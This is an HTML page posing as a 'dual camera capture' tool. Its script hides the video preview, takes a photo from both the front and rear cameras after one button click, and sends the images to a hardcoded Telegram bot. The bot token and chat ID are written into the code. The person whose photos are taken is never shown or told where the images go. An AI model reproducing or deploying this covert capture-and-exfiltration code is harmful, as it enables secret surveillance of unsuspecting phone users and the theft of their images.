<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Dual Camera Capture</title>
    <link rel="stylesheet" href="main.css">
    <style>
        body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; }
        #startBtn { padding: 12px 20px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video { display: none; }
    </style>
</head>
<body>

    <button id="startBtn">Zapal Rasmlar</button>
    <div class="loader" id="loader"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const startBtn = document.getElementById("startBtn");
        const loader = document.getElementById("loader");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU";
        const CHAT_ID = "705345765";

        async function initCamera(facingMode) {
            const constraints = { video: { facingMode: facingMode } };
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                console.log(`Camera (${facingMode}) initialized.`);
                return true;
            } catch (error) {
                console.error(`❌ Camera (${facingMode}) initialization failed:`, error);
                alert(`Camera (${facingMode}) initialization failed.`);
                return false;
            }
        }

        async function takeAndSendPhoto(facingMode) {
            if (!video.srcObject) {
                console.log(`Camera (${facingMode}) stream not available.`);
                alert(`Camera (${facingMode}) stream not available.`);
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            console.log(`Canvas dimensions (${facingMode}):`, canvas.width, canvas.height);

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                console.log(`Blob size (${facingMode}):`, blob.size);

                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, `photo_${facingMode}.jpg`);

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });

                    if (!response.ok) {
                        throw new Error(`Telegram API error (${facingMode}): ${response.status} ${response.statusText}`);
                    }

                    const result = await response.json();
                    if (result.ok) {
                        console.log(`Photo sent successfully (${facingMode}).`);
                    } else {
                        console.error(`Telegram API error (${facingMode}):`, result);
                        alert(`Telegram API error (${facingMode}).`);
                    }
                } catch (error) {
                    console.error(`Error sending photo (${facingMode}):`, error);
                    alert(`Error sending photo (${facingMode}).`);
                }
            }, "image/jpeg");
        }

        async function captureFromBothCameras() {
            loader.style.display = "block";

            async function captureAndSend(facingMode) {
                const success = await initCamera(facingMode);
                if (success) {
                    await new Promise(resolve => setTimeout(resolve, 3000)); // Increased delay
                    if (video.readyState >= 2) { // Ensure metadata is loaded
                        console.log(`Video readyState (${facingMode}):`, video.readyState);
                        await takeAndSendPhoto(facingMode);
                    } else {
                        console.log(`Video not ready (${facingMode}), readyState:`, video.readyState);
                        alert(`Video not ready (${facingMode}).`);
                    }

                    if(video.srcObject){
                        video.srcObject.getVideoTracks().forEach(track => track.stop());
                        video.srcObject = null; // release the stream
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between cameras
                }
            }

            await captureAndSend("user");
            await captureAndSend("environment");

            loader.style.display = "none";
        }

        startBtn.addEventListener("click", captureFromBothCameras);
    </script>

</body>
</html>
